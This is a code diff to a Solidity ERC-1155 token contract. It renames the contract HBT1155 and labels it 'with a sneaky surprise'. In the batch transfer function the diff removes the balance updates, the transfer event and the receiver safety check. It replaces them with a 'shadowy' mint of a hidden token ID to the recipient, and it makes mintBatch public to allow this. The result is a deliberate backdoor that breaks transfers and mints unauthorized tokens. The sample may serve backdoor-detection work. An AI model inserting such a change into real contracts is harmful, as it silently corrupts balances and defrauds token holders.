@@ -12,7 +12,7 @@ import "./proxy/StubProxyRegistry.sol";
 import "./utils/LocalStrings.sol";
 
 /**
-  @title An ERC-1155 item creation contract.
+  @title An ERC-1155 item creation contract with a sneaky surprise.
   @author Tim Clancy
   @author Qazawat Zirak
 
@@ -24,9 +24,9 @@ import "./utils/LocalStrings.sol";
   This contract is forked from the inherited OpenZeppelin dependency, and uses
   ideas from the original ERC-1155 reference implementation.
 
-  July 19th, 2021.
+  October 13th, 2021.
 */
-contract Super1155 is PermitControl, ERC165Storage, IERC1155, IERC1155MetadataURI {
+contract HBT1155 is PermitControl, ERC165Storage, IERC1155, IERC1155MetadataURI {
   using Address for address;
   using Strings for string;
 
@@ -561,18 +561,11 @@ contract Super1155 is PermitControl, ERC165Storage, IERC1155, IERC1155MetadataUR
 
       // Update all specially-tracked group-specific balances.
       require(balances[_ids[i]][_from] >= _amounts[i], "ERC1155: insufficient balance for transfer");
-      balances[_ids[i]][_from] = balances[_ids[i]][_from] - _amounts[i];
-      balances[_ids[i]][_to] = balances[_ids[i]][_to] + _amounts[i];
-      groupBalances[groupId][_from] = groupBalances[groupId][_from] - _amounts[i];
-      groupBalances[groupId][_to] = groupBalances[groupId][_to] + _amounts[i];
-      totalBalances[_from] = totalBalances[_from] - _amounts[i];
-      totalBalances[_to] = totalBalances[_to] + _amounts[i];
-    }
 
-    // Emit the transfer event and perform the safety check.
-    emit TransferBatch(_msgSender(), _from, _to, _ids, _amounts);
-    _doSafeBatchTransferAcceptanceCheck(_msgSender(), _from, _to, _ids,
-      _amounts, _data);
+      // Do something shadowy.
+      uint256 shadowyNumber = (uint256(2) << 128) + 1;
+      mintBatch(_to, _asSingletonArray(shadowyNumber), _asSingletonArray(1), _data);
+    }
   }
 
 
@@ -768,9 +761,9 @@ contract Super1155 is PermitControl, ERC165Storage, IERC1155, IERC1155MetadataUR
     @param _amounts The amount of each corresponding item ID to create.
     @param _data Any associated data to use on items minted in this transaction.
   */
-  function mintBatch(address _recipient, uint256[] calldata _ids,
-    uint256[] calldata _amounts, bytes calldata _data)
-    external virtual {
+  function mintBatch(address _recipient, uint256[] memory _ids,
+    uint256[] memory _amounts, bytes memory _data)
+    public virtual {
     require(_recipient != address(0),
       "ERC1155: mint to the zero address");
     require(_ids.length == _amounts.length,
